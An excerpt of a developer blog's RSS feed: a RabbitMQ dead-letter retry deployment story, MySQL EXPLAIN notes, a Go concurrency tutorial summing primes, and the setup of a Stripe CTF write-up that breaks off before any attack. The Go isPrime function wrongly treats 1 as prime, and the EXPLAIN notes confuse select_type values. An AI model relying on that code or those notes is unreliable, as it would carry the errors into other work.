    &lt;/figcaption&gt;
    
&lt;/figure&gt;


&lt;h1 id=&#34;implementation-testing-strategy-and-deployment-saga&#34;&gt;Implementation, Testing Strategy and Deployment saga&lt;/h1&gt;

&lt;h2 id=&#34;implementation&#34;&gt;Implementation&lt;/h2&gt;

&lt;p&gt;Implementation is probably the most straight-forward phase of the project once we have the design on paper.  The only obstacle is that the library we use for writing rabbitmq consumers (sparkplug) does not support declaring queues with extra parameters, and the DLX related parameters: &lt;code&gt;x-dead-letter-exchange&lt;/code&gt; &lt;code&gt;x-dead-letter-routing-key&lt;/code&gt;, and &lt;code&gt;x-message-ttl&lt;/code&gt; are all &amp;ldquo;extra parameters&amp;rdquo; according to &lt;code&gt;amqplib&lt;/code&gt;, which is used by sparkplug. To solve this, I sent this &lt;a href=&#34;https://github.com/ojacobson/sparkplug/pull/10/files&#34;&gt;PR&lt;/a&gt; to sparkplug, so it recognizes extra parameters and pass them down to amqp library.&lt;/p&gt;

&lt;p&gt;Another road block appeared when we ran the system on our dev images for the first time. The underlying amqplib would error out on startup. Upon closer investigation, it appeared the error happened while talking to rabbitmq and the amqplib can&amp;rsquo;t handle certain rabbitmq frames. So I went searching for the amqp project, only to find out that it was deprecated &lt;a href=&#34;https://pypi.python.org/pypi/amqplib&#34;&gt;long ago&lt;/a&gt;. Fortunately, there&amp;rsquo;s a fork of the library &lt;a href=&#34;https://pypi.python.org/pypi/amqp&#34;&gt;amqp&lt;/a&gt; that&amp;rsquo;s maintained by the reputable &lt;a href=&#34;http://www.celeryproject.org/&#34;&gt;Celery project&lt;/a&gt;. It&amp;rsquo;s has API compatibility with amqplib and appeared to be a drop-in replacement. We dropped it in and everything seems to work. Reading the online literature, it seems to be the case that the old library does not handle the &lt;code&gt;TTL&lt;/code&gt; amqp extension.&lt;/p&gt;

&lt;h2 id=&#34;testing-strategy&#34;&gt;Testing Strategy&lt;/h2&gt;

&lt;p&gt;So, since the 3rd party API timeout is an edge case, they did not provide a way trigger this behaviour the same way we can trigger, say, a declined transaction. We could fake the URL for the 3rd party service in DNS or &lt;code&gt;/etc/hosts&lt;/code&gt; or we can change the SDK to change the base url for their API to somewhere else and cause a timeout that way, but neither is ideal. The biggest disadvantage is that we have no way of getting a request out of the retry state.&lt;/p&gt;

&lt;p&gt;Eventually, we decided to &lt;a href=&#34;http://en.wikipedia.org/wiki/Man-in-the-middle_attack&#34;&gt;MITM&lt;/a&gt; ourselves :) We can write a simple proxy server, and for the most part, it&amp;rsquo;s going to be a pass-through, but on certain requests, we intercept it and return an unknown error (500 series with specific response body).  To trigger it, we set the checkout amount to &lt;code&gt;$666&lt;/code&gt;, and in the proxy, we keep an internal counter based on the checkout&amp;rsquo;s unique id, and increment the counter every time it&amp;rsquo;s retried, and then we can set a max retry threshold in the proxy so the proxy becomes a pass through again if the max retry threshold is reached.&lt;/p&gt;

&lt;p&gt;We used this small nifty library &lt;a href=&#34;https://github.com/allfro/pymiproxy&#34;&gt;pymiproxy&lt;/a&gt; as a base for our proxy server. It turns out the proxy is pretty straight-forward as well, and a big shout-out to the author of pymiproxy.&lt;/p&gt;

&lt;h2 id=&#34;deployment&#34;&gt;Deployment&lt;/h2&gt;

&lt;p&gt;Everything until now is like a cake walk. Sure, there are some problems with the underlying libraries but that requires patching but they were quite easy to identify and fix. Deployment, on the other hand, has been like riding on the &lt;a href=&#34;https://www.youtube.com/watch?v=Mgsbau5qkTE&#34;&gt;Behemoth in Canada&amp;rsquo;s Wonderland&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First of all, while getting the code onto the testing environment, we encountered the first gremlin. The staging is running on the exact same version of rabbitmq and the exact same configuration. However, on staging, when a message is published on the DLQ (&lt;code&gt;Qa&lt;/code&gt;) in our example, after &lt;code&gt;TTL&lt;/code&gt;, the message would simply disappear and did not get routed to &lt;code&gt;Qb&lt;/code&gt;. What&amp;rsquo;s worse, sometimes even &lt;code&gt;Qa&lt;/code&gt; is completely gone after the message is dropped on the floor! This is terribly frustrating. The queue is declared as durable, and so is the exchange. I even did a side-by-side comparison of the sparkplug log output to see if anything is different. Well, there was! The declaration sequence is different between staging and dev. On dev, the dead-letter exchange is declared before &lt;code&gt;Qa&lt;/code&gt; which specifies &lt;code&gt;x-dead-letter-exchange&lt;/code&gt;. That makes sense! Reading the &lt;a href=&#34;https://github.com/ojacobson/sparkplug/blob/master/sparkplug/config/__init__.py#L57-L77&#34;&gt;sparkplug code&lt;/a&gt;, it calculates the dependencies between queues, exchanges, bindings and consumers to determine the order of which they should be declared. However, our modification that enabled sparkplug to pass down DLX, but sparkplug has no idea that the queue depends on the DLX! Based on this observation, I cooked up another &lt;a href=&#34;https://github.com/freshbooks/sparkplug/pull/2/files&#34;&gt;PR&lt;/a&gt; such that if DLX is specified, make sure we make the DLX a dependency of the queue so the exchange gets declared before it. Did a few tests locally, and hey, it appears to be working!&lt;/p&gt;

&lt;p&gt;Just as I thought my shrewed observation has solved this major mystery, the second day, people reported that the queue started go AWOL again! Grumbled, I sat down and read carefully the documentation on &lt;a href=&#34;https://www.rabbitmq.com/dlx.html&#34;&gt;dead-letter exchange&lt;/a&gt; and discovered this:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note that the exchange does not have to be declared when the queue is declared, but it should exist by the time messages need to be dead-lettered; if it is missing then, the messages will be silently dropped.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This invalidates my previous hypothesis that the out-of order declaration was the root cause of the problem. There we go, I was back to square one.&lt;/p&gt;

&lt;p&gt;At this time, I wanted to try a different approach. Instead of forming hypothesis from observation, I searched for evidence. I went on the server, and start to look at the logs to search for any traces that can be salvaged. The rabbitmq log is very noisy with all the connection messages. Once in a while you get something remotely interesting, but they were not relevant. Then I manually published a message on the queue, and waited for the message and queue to disappear. Lo and behold, there&amp;rsquo;s something in the logs!&lt;/p&gt;

&lt;script src=&#34;//gist.github.com/kevinjqiu/e626bcc40eb803214968.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;There&amp;rsquo;s our smoking gun! Further gooling revealed &lt;a href=&#34;http://lists.rabbitmq.com/pipermail/rabbitmq-discuss/2012-April/019368.html&#34;&gt;this&lt;/a&gt;. That&amp;rsquo;s EXACTLY our issue! And the version of rabbitmq we&amp;rsquo;re using is EXACTLY 2.8.1! What a relief! We just need to upgrade to 2.8.2 and everything would be fine.&lt;/p&gt;

&lt;p&gt;So there I was, preparing an internal repository to host the rpm (since we&amp;rsquo;re on a hopelessly old version of CentOS), and prepared puppet changes for the new version. Deployed on all the environments and sent it off to QA. QA ok&amp;rsquo;ed it just before the weekend and life is good again.&lt;/p&gt;

&lt;p&gt;Except, not at all! There are a few more surprises waiting for us before the end of tunnel. First of all, our partner whose payment API we&amp;rsquo;re integrating has received an imminent DDOS threat, and fearing not having a retry mechanism would caused a huge burden for us and our support crew, we need to get this out to production ASAP. After pulling some levers and convincing our ops team that this is a relatively low risk point release upgrade (from rabbitmq 2.8.1 to 2.8.2), we got the green light and ops are on their way upgrading rabbitmq. Everything seemed to be going alone well, until, when we switched all components to point to the hosts that&amp;rsquo;s on the new rabbitmq, our app stopped working! Phone calls flooded in, alerts set off everywhere and on top of that, even the streets in front of our building had a couple of emergency vehicles passing by! Goodness, what have we done! Ops quickly rolled it back, and we were left dumbfounded by this yet another surprise.&lt;/p&gt;

&lt;p&gt;Analyzing the logs from various components during the downtime, it appeared the components talking to rabbitmq have timed out trying to publish messages. We checked that the hosts can indeed reach each other, all the names can be resolved and firewall rules are not in effect. So, we hit a wall again.&lt;/p&gt;

&lt;p&gt;On the second day, we regrouped, and experimented on the backup data centre. We upgraded, and tried to put a message on the queue, and guess what, it blocked! It&amp;rsquo;s great that we reproduced the issue. Since the staging environment worked just fine, I captured &lt;code&gt;strace&lt;/code&gt; on the staging environment, and ops did the same on prod, and compared the output. It&amp;rsquo;s pretty clear that the process was waiting on reading socket (syscall was &lt;code&gt;recvfrom(...)&lt;/code&gt;) and it blocked. Then I did &lt;code&gt;tcpdump&lt;/code&gt; and compared that with the output on prod, and also proven to be futile.&lt;/p&gt;

&lt;p&gt;In that afternoon, our fortune suddenly took a positive turn, when one of the ops discovered this in the logs while starting the new rabbitmq:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;=INFO REPORT==== 29-Apr-2015::14:51:09 ===
Disk free space limit now exceeded. Free bytes:19033128960 Limit:50634379264
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, this version of rabbitmq started to check free disk space, and &lt;strong&gt;blocks&lt;/strong&gt; incoming message if the disk space is deemed inadequate! Wow, this is so unexpected that we all laughed when we discovered this to be the root cause. However, for me, I need to be convinced that why it wasn&amp;rsquo;t an issue for staging environment.&lt;/p&gt;

&lt;p&gt;So I cloned rabbitmq git repository, and looked for anything that&amp;rsquo;s related to &lt;code&gt;disk_free_limit&lt;/code&gt;. Finally, I found this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-erlang&#34;&gt;{disk_free_limit, {mem_relative, 1.0}},
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;from &lt;a href=&#34;https://github.com/rabbitmq/rabbitmq-server/blob/rabbitmq_v2_8_2/ebin/rabbit_app.in#L22&#34;&gt;here&lt;/a&gt;. Since we&amp;rsquo;re using the default config, this is in effect, and it essentially says &amp;ldquo;stop accepting message if the disk space is not at least as big as the RAM&amp;rdquo;, and it just so happens on prod, we have 50G of RAM and therefore, require at least 50G of free space for rabbitmq to start accepting messages!&lt;/p&gt;

&lt;p&gt;Reading the rabbitmq 2.8.2 release notes, and they &lt;strong&gt;did&lt;/strong&gt; &lt;a href=&#34;https://www.rabbitmq.com/release-notes/README-2.8.2.txt&#34;&gt;mention&lt;/a&gt; this &amp;ldquo;feature&amp;rdquo;, but failed to mention that it could block your connection &lt;strong&gt;forever&lt;/strong&gt; and bring your site down&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;There you go.  That&amp;rsquo;s our adventure implementing and deploying delayed retry using rabbitmq&amp;rsquo;s DLX and TTL. It&amp;rsquo;s frustrating and rewarding at the same time, and there&amp;rsquo;s definitely something we can all take home with:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Software is hard, even for experienced developers and ops&lt;/li&gt;
&lt;li&gt;Gather all the evidences before forming hypothesis on the root cause&lt;/li&gt;
&lt;li&gt;Certainly, read the docs thoroughly before hypothesizing&lt;/li&gt;
&lt;li&gt;Expect problems when switching environments&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I haven&amp;rsquo;t been blogging for a while, partly because life catches up, and partly because I&amp;rsquo;ve been less than disciplined but I spent some time writing down this experience worth remembering :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MySQL EXPLAIN explained</title>
      <link>http://blog.idempotent.ca/2014/11/27/mysql-explain-explained/</link>
      <pubDate>Thu, 27 Nov 2014 00:56:59 -0500</pubDate>
      
      <guid>http://blog.idempotent.ca/2014/11/27/mysql-explain-explained/</guid>
      <description>

&lt;p&gt;Below is my notes from watching the &lt;a href=&#34;https://www.youtube.com/watch?v=ZoLoIFW1H6g&#34;&gt;MySQL&amp;rsquo;s EXPLAIN demystified&lt;/a&gt; webinar.  All credits go to Baron Schwartz for this excellent intro to MySQL&amp;rsquo;s query explain.&lt;/p&gt;

&lt;h2 id=&#34;how-does-mysql-execute-queries&#34;&gt;How does MySQL execute queries?&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;SQL =&amp;gt; Parse Tree =&amp;gt; Execution plan&lt;/li&gt;
&lt;li&gt;The execution plan is a data structure, not byte-code&lt;/li&gt;
&lt;li&gt;The executor makes storage engine calls&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;execution-plan&#34;&gt;Execution plan&lt;/h2&gt;

&lt;p&gt;&amp;ldquo;Deep left tree&amp;rdquo; &amp;ndash; always&lt;/p&gt;

&lt;h2 id=&#34;explain-output-columns&#34;&gt;Explain output columns&lt;/h2&gt;

&lt;h3 id=&#34;id&#34;&gt;id&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;which &lt;code&gt;SELECT&lt;/code&gt; the row belongs to&lt;/li&gt;
&lt;li&gt;Labelled sequentially&lt;/li&gt;
&lt;li&gt;complex select:

&lt;ul&gt;
&lt;li&gt;subquery: numbered according to the position in SQL text&lt;/li&gt;
&lt;li&gt;derived: executed as a temporary table&lt;/li&gt;
&lt;li&gt;union: fill a temp table, then read out with a &lt;code&gt;NULL&lt;/code&gt; id&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;select-type&#34;&gt;select_type&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;simple: there&amp;rsquo;s only one &lt;code&gt;SELECT&lt;/code&gt; in the whole query, &lt;code&gt;select_type&lt;/code&gt; is &lt;code&gt;PRIMARY&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;complex:

&lt;ul&gt;
&lt;li&gt;subquery: numbered according to the position in SQL text&lt;/li&gt;
&lt;li&gt;derived: executed as a temporary table&lt;/li&gt;
&lt;li&gt;union: fill a temp table, then read out with a &lt;code&gt;NULL&lt;/code&gt; id&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;table&#34;&gt;table&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;table name or alias&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;DerivedN&amp;gt;&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt; correspond to &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;unionM,N&amp;gt;&lt;/code&gt;, &lt;code&gt;M&lt;/code&gt;, &lt;code&gt;N&lt;/code&gt; correspond to &lt;code&gt;id&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;type&#34;&gt;type&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;describes how MySQL will access the rows&lt;/li&gt;
&lt;li&gt;Possible values:

&lt;ul&gt;
&lt;li&gt;ALL: table scan&lt;/li&gt;
&lt;li&gt;index: full index scan&lt;/li&gt;
&lt;li&gt;range: range of an index&lt;/li&gt;
&lt;li&gt;ref: value as a reference to look into an index if rows in the index match the value&lt;/li&gt;
&lt;li&gt;eq_ref: like &lt;code&gt;ref&lt;/code&gt; but unique (unique index or PK)&lt;/li&gt;
&lt;li&gt;const&lt;/li&gt;
&lt;li&gt;system: does not require accessing a table, e.g., &lt;code&gt;MAX(col)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;NULL: no table involved, e.g., &lt;code&gt;SELECT 1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;index-related-columns-possible-kes-key-key-len&#34;&gt;Index-related columns (possible_kes, key, key_len)&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;possible_keys: which indexes were considered?&lt;/li&gt;
&lt;li&gt;key: which indexes did the optimizer choose?&lt;/li&gt;
&lt;li&gt;key_len: how many bytes of the index will be used? if key_len less than the index (e.g., compound index), that means MySQL didn&amp;rsquo;t use the whole index&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;ref&#34;&gt;ref&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;The source of values used for lookups&lt;/li&gt;
&lt;li&gt;&lt;code&gt;const&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NULL&lt;/code&gt; means not looking for a particular value for that table&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;rows&#34;&gt;rows&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Estimated rows to examine in the table/index&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;extra&#34;&gt;extra&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;Using index

&lt;ul&gt;
&lt;li&gt;If the query only involve columns that are in the index, MySQL can query directly against the index, without looking at the table at all&lt;/li&gt;
&lt;li&gt;Hitting a index (&lt;code&gt;type&lt;/code&gt;) does not necessarily mean &lt;code&gt;Using index&lt;/code&gt;.  If not &lt;code&gt;Using index&lt;/code&gt;, MySQL got the indexed value but still has to go back and look it up in the table for other columns, which may result in lots of random IO (slow)&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Using where

&lt;ul&gt;
&lt;li&gt;Post-filter using the where clause&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Using temporary

&lt;ul&gt;
&lt;li&gt;The query is going to create an implicit temporary table&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;Using filesort

&lt;ul&gt;
&lt;li&gt;Sorting in memory, if it doesn&amp;rsquo;t fit, then write to file&lt;/li&gt;
&lt;li&gt;Algorithm is quick sort&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>First dip into Golang&#39;s concurrency</title>
      <link>http://blog.idempotent.ca/2013/11/20/first-dip-into-golangs-concurrency/</link>
      <pubDate>Wed, 20 Nov 2013 11:53:00 +0000</pubDate>
      
      <guid>http://blog.idempotent.ca/2013/11/20/first-dip-into-golangs-concurrency/</guid>
      <description>

&lt;p&gt;I have been toying with Google&amp;rsquo;s &lt;a href=&#34;http://golang.org&#34;&gt;Go&lt;/a&gt; language lately.  The native support for concurrent programming is one of Go&amp;rsquo;s major selling point.&lt;/p&gt;

&lt;p&gt;Go has low-level primitives for concurrent programming such as &lt;a href=&#34;http://golang.org/pkg/sync/#Mutex&#34;&gt;mutexes&lt;/a&gt; and &lt;a href=&#34;http://golang.org/pkg/sync/atomic/&#34;&gt;atomic&lt;/a&gt;, but also provides high-level language constructs for building concurrent programs via goroutines and channels.&lt;/p&gt;

&lt;p&gt;Goroutines are functions executing in the same address space as other goroutines, like threads, but unlike threads, they communicate to each other via channels, not shared variables.&lt;/p&gt;

&lt;p&gt;Channels provide a lock-free mechanism for goroutines to communicate.  To me, conceptually it feels a lot like a Unix socket: you can wait on it for data, or you can send data to it.  In Go, channels are also strongly and statically typed.&lt;/p&gt;

&lt;p&gt;For me, the best way to learn something is to put it to practice.  I use one problem from &lt;a href=&#34;http://projecteuler.net&#34;&gt;Project Euler&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Find the sum of all prime numbers under 2 million
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I wrote an Erlang version of this problem &lt;a href=&#34;http://blog.idempotent.ca/blog/2009/06/01/fast-and-elegant-way-to-sum-primes-in-a-gigantic-range/&#34;&gt;before&lt;/a&gt;, but since then, Erlang kind of fell off my radar.  However, the problem and the concurrent solution is still relevant.&lt;/p&gt;

&lt;h1 id=&#34;test-if-a-number-is-prime&#34;&gt;Test if a number is prime&lt;/h1&gt;

&lt;p&gt;I&amp;rsquo;ll briefly go over primality test function, since it&amp;rsquo;s not the focus of this blog post:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func isPrime(n int) bool {
    if n == 1 || n == 2 {
        return true
    }

    if math.Mod(float64(n), 2) == 0 {
        return false
    }

    for i := 3.0; i &amp;lt;= math.Floor(math.Sqrt(float64(n))); i += 2.0 {
        if math.Mod(float64(n), i) == 0 {
            return false
        }
    }

    return true
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I understand there are other faster primality tests but I opted for this basic algorithm for simplicity.&lt;/p&gt;

&lt;h1 id=&#34;non-concurrent-version&#34;&gt;Non-concurrent version&lt;/h1&gt;

&lt;p&gt;A naive way to solve this problem is to call &lt;code&gt;isPrime&lt;/code&gt; on every number below 2 million, if it&amp;rsquo;s a prime, add it to the tally.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func sumPrimesUpto(n int) int {
    sum := 0
    for i := 1; i &amp;lt;= n; i++ {
        if isPrime(i) {
            sum += i
        }
    }

    return sum
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here&amp;rsquo;s the main function:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;func main() {
    upperBound, err := strconv.Atoi(os.Args[1])
    if err != nil {
        fmt.Println(&amp;quot;Invalid argument.&amp;quot;)
        os.Exit(1);
    }

    result := sumPrimesUpto(upperBound)
    fmt.Println(result)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now run it and time it:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;$ time go run sumprimes1.go 2000000
142913828923

real    0m27.032s
user    0m26.953s
sys     0m0.029s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Not too bad.  I remember when I ran this algorithm 4 years ago on my previous laptop (Core-2 Duo) I wasn&amp;rsquo;t able to produce any result in a tolerable timeframe.  My current machine is a 3-year old Quad Core i7.&lt;/p&gt;

&lt;h1 id=&#34;concurrent-version&#34;&gt;Concurrent version&lt;/h1&gt;

&lt;p&gt;If you are on Linux and you open system monitor while the previous program was running, you can see that only one CPU was saturated and constantly running at near 100%, but all other cores are nearly idle.  Of course this is a huge waste of our computing resource.  &lt;code&gt;isPrime&lt;/code&gt; function is what takes up the CPU load, and because we&amp;rsquo;re running testing the primality of all 2 million numbers inside a single thread, all of them have to be tested one after the other.  This is not great.  Instead, because we have more than one CPU core, we can give the other cores chances to do some of the work for us.&lt;/p&gt;

&lt;p&gt;If you were writing a Java or C++ program, you&amp;rsquo;d:
- make a variable for the sum
- loop from 1 to 2 million
- spawn a new thread to do the primality test
- inside the thread, if the primality test succeeds, lock the access to the &lt;code&gt;sum&lt;/code&gt; variable, update &lt;code&gt;sum&lt;/code&gt;, unlock&lt;/p&gt;

&lt;p&gt;Programs like this have a higher complexity than it should.  It may not look like it&amp;rsquo;s too complicated for this case, but synchronization using &lt;a href=&#34;http://en.wikipedia.org/wiki/Lock_(computer_science)#Disadvantages&#34;&gt;locks&lt;/a&gt; has inherent problems and is usually a source of bugs and defects.  Also, spawning as many threads as you can normally won&amp;rsquo;t give you more throughput.  On the contrary, if you hand the OS more threads at once than the number of physical cores, context switching will happen and it will decrease your performance.&lt;/p&gt;

&lt;p&gt;Go&amp;rsquo;s approach is very similar to Erlang&amp;rsquo;s in concept.  In Erlang, the actor processes can&amp;rsquo;t share variables, but instead, they can send data to the other processes.  In Go, goroutines normally don&amp;rsquo;t share variables, but they communicate via the use of channels.&lt;/p&gt;

&lt;h2 id=&#34;channels&#34;&gt;Channels&lt;/h2&gt;

&lt;p&gt;For this problem, we need to have the following channels:
- jobs: the outstanding jobs need to be performed.  Each job is a number whose primality needs to be tested.  It&amp;rsquo;s a buffered channel whose size is the number of physical cores.
- results: the prime numbers that are already tested.  Buffered channel.  Can be as big as reasonable.
- done: whether all workers have finished their job. Also a buffered channel whose size is the number of physical cores.&lt;/p&gt;

&lt;h2 id=&#34;goroutines&#34;&gt;Goroutines&lt;/h2&gt;

&lt;p&gt;We need the following goroutines to:
- take the next number and put it in the &lt;code&gt;jobs&lt;/code&gt; channel
- receive the next available job, run primality test, put the number on the &lt;code&gt;results&lt;/code&gt; channel if succeeded, and signal the &lt;code&gt;done&lt;/code&gt; channel.
- receive the signal from the &lt;code&gt;done&lt;/code&gt; channel.  If no signals are received, we have done all the primality test.&lt;/p&gt;

&lt;p&gt;Finally, we need to have a function to sum up all results.&lt;/p&gt;

&lt;h2 id=&#34;data-structures&#34;&gt;Data structures&lt;/h2&gt;

&lt;p&gt;We want an abstraction of a &lt;code&gt;Job&lt;/code&gt;.  In Go, that&amp;rsquo;s a struct:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type Job struct {
    n int
    results chan&amp;lt;-int
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A job knows what number to test, and the results channel to which we can send the result.&lt;/p&gt;

&lt;p&gt;A job also knows how to &lt;code&gt;Do&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func (job *Job) Do() {
    if isPrime(job.n) {
        job.results &amp;lt;- job.n
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In Go, a function with a receiver is practically a method on a struct and is able to be called with &lt;code&gt;receiver.method&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;rewrite-sumprimesupto&#34;&gt;Rewrite sumPrimesUpto&lt;/h2&gt;

&lt;p&gt;Now, rewrite the &lt;code&gt;sumPrimesUpto&lt;/code&gt; function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;var workers = runtime.NumCPU()

func sumPrimesUpto(n int) int {
    jobs := make(chan Job, workers)
    results := make(chan int, n)
    done := make(chan struct{}, workers)

    go addJobs(jobs, results, n)

    for i := 0; i &amp;lt; workers; i++ {
        go doJobs(done, jobs)
    }

    go wait(done, results)

    return tally(results)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;First, we need to know how many CPU cores the underlying platform knows about.  We only make the channel as big as the number of CPU cores.&lt;/p&gt;

&lt;p&gt;Then, we make the channels.  One thing to note is that the &lt;code&gt;done&lt;/code&gt; channel receives an empty &lt;code&gt;struct&lt;/code&gt;, because we use that only for signaling.  We don&amp;rsquo;t really care what value of the signal is.  We could define a surrogate type: &lt;code&gt;type Signal struct{}&lt;/code&gt;, but an anonymous type will do just fine.&lt;/p&gt;

&lt;p&gt;After that, we call &lt;code&gt;addJobs&lt;/code&gt; as a goroutine.  The line &lt;code&gt;jobs &amp;lt;- Job{i, results}&lt;/code&gt; will block if the channel is already full.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func addJobs(jobs chan&amp;lt;-Job, results chan&amp;lt;-int, n int) {
    for i := 1; i &amp;lt;= n; i++ {
        jobs &amp;lt;- Job{i, results}
    }
    close(jobs)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In a separate goroutine, we take the jobs from the &lt;code&gt;jobs&lt;/code&gt; channel and process them in &lt;code&gt;doJobs&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func doJobs(done chan&amp;lt;-struct{}, jobs &amp;lt;-chan Job) {
    for job := range jobs {
        job.Do()
    }
    done &amp;lt;- struct{}{}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We also signal the &lt;code&gt;done&lt;/code&gt; channel when the job is done.  &lt;code&gt;struct{}{}&lt;/code&gt; creates an instance of the anonymous type we use as the signal.&lt;/p&gt;

&lt;p&gt;In another separate goroutine, we wait until there&amp;rsquo;s no more signals on the &lt;code&gt;done&lt;/code&gt; channel.  This means that we have finished processing all jobs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func wait(done &amp;lt;-chan struct{}, results chan int) {
    for i := 0; i &amp;lt; workers; i++ {
        &amp;lt;-done
    }
    close(results)
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;At this point, we can safely close the &lt;code&gt;results&lt;/code&gt; channel as there won&amp;rsquo;t be any new results coming in.&lt;/p&gt;

&lt;p&gt;Finally, we can run &lt;code&gt;tally&lt;/code&gt; on the results channel.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func tally(results &amp;lt;-chan int) int {
    retval := 0
    for result := range results {
        retval += result
    }

    return retval
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One thing worth mentioning is that even though the channels we made are all bi-directional channels, in the specific functions, we can make them more restrictive by making them send-only (chan&amp;lt;- Type) or receive-only (&amp;lt;-chan Type) according to their actual usage in the local function to avoid accidents.&lt;/p&gt;

&lt;p&gt;The full gist can be found &lt;a href=&#34;https://gist.github.com/kevinjqiu/7568264#file-sumprimes-go&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&#34;performance&#34;&gt;Performance&lt;/h2&gt;

&lt;p&gt;So how does this concurrent version faire?&lt;/p&gt;

&lt;pre&gt;&lt;code&gt; $ time go run sumprimes.go 2000000
 CPUS=4
 142913828923

 real    0m12.534s
 user    0m44.289s
 sys     0m0.175s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On my Quad Core i7, it takes 12 seconds, almost twice as fast as the non-concurrent version!  And if you open System Monitor, you can see all 4 cores are running near 100%.&lt;/p&gt;

&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;

&lt;p&gt;So there&amp;rsquo;s my first dip into Go&amp;rsquo;s concurrency with an old problem. I like the concurrency primitives Go provides, even though it takes some getting used to.  Conceptually, goroutines are very similar to Erlang&amp;rsquo;s actors.  Go has the advantage of a C-ish syntax that doesn&amp;rsquo;t look like Prolog and it doesn&amp;rsquo;t require a separate runtime as Erlang does.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Stripe Capture The Flag 2.0 - Problem 3</title>
      <link>http://blog.idempotent.ca/2012/09/19/stripe-capture-the-flag-2.0---problem-3/</link>
      <pubDate>Wed, 19 Sep 2012 00:01:00 +0000</pubDate>
      
      <guid>http://blog.idempotent.ca/2012/09/19/stripe-capture-the-flag-2.0---problem-3/</guid>
      <description>

&lt;h2 id=&#34;level-3&#34;&gt;Level 3&lt;/h2&gt;

&lt;p&gt;Finally we get to level 3. Here&amp;rsquo;s the setup:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;After the fiasco back in Level 0, management has decided to fortify the Secret Safe into an unbreakable solution (kind of like Unbreakable Linux). The resulting product is Secret Vault, which is so secure that it requires human intervention to add new secrets.

A beta version has launched with some interesting secrets (including the password to access Level 4)
